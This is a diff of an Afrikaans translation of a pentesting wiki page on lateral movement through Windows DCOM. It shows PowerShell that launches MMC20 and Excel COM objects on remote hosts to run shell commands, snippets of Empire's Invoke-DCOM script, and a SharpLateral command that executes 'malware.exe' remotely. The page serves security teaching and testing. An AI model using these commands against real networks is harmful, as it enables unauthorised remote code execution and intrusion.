@@ -19,7 +19,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 **Vir meer inligting oor hierdie tegniek, kyk die oorspronklike pos van [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-Distributed Component Object Model (DCOM) objek bied 'n interessante vermoë vir netwerk-gebaseerde interaksies met objek. Microsoft bied omvattende dokumentasie vir beide DCOM en Component Object Model (COM), beskikbaar [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). 'n Lys van DCOM-toepassings kan verkry word met die PowerShell-opdrag:
+Distributed Component Object Model (DCOM) objekke bied 'n interessante vermoë vir netwerk-gebaseerde interaksies met objekke. Microsoft bied omvattende dokumentasie vir beide DCOM en Component Object Model (COM), beskikbaar [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). 'n Lys van DCOM toepassings kan verkry word met die PowerShell opdrag:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
@@ -29,9 +29,9 @@ Hierdie funksie fasiliteer die uitvoering van opdragte oor 'n netwerk deur 'n DC
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-Hierdie opdrag verbind met die DCOM-toepassing en keer 'n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan aangeroep word om 'n proses op die afstandlike gasheer uit te voer. Die proses behels die volgende stappe:
+Hierdie opdrag maak verbinding met die DCOM-toepassing en keer 'n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan aangeroep word om 'n proses op die afstandsbediener uit te voer. Die proses behels die volgende stappe:
 
-Check methods:
+Kontroleer metodes:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
@@ -65,9 +65,9 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 ```
 ### Lateral Movement with Excel DCOM Objects
 
-Laterale beweging kan bereik word deur DCOM Excel-objekte te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.
+Laterale beweging kan bereik word deur DCOM Excel-objekte te benut. Vir gedetailleerde inligting is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.
 
-Die Empire-projek bied 'n PowerShell-skrip, wat die gebruik van Excel vir afstandkode-uitvoering (RCE) demonstreer deur DCOM-objekte te manipuleer. Hieronder is snitte van die skrip beskikbaar op [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
+Die Empire-projek bied 'n PowerShell-skrip, wat die gebruik van Excel vir afstandkode-uitvoering (RCE) demonstreer deur DCOM-objekte te manipuleer. Hieronder is snitte van die skrip beskikbaar op [Empire se GitHub-bewaarplek](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -96,7 +96,7 @@ Twee toestelle word beklemtoon vir die outomatisering van hierdie tegnieke:
 
 - **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek verskaf word en die oproep van verskillende metodes vir die uitvoering van kode op afstandmasjiene vereenvoudig. Hierdie skrip is beskikbaar by die Empire GitHub-bewaarplek.
 
-- **SharpLateral**: 'n Toestel wat ontwerp is om kode op afstand uit te voer, wat gebruik kan word met die opdrag:
+- **SharpLateral**: 'n Toestel ontwerp om kode op afstand uit te voer, wat gebruik kan word met die opdrag:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
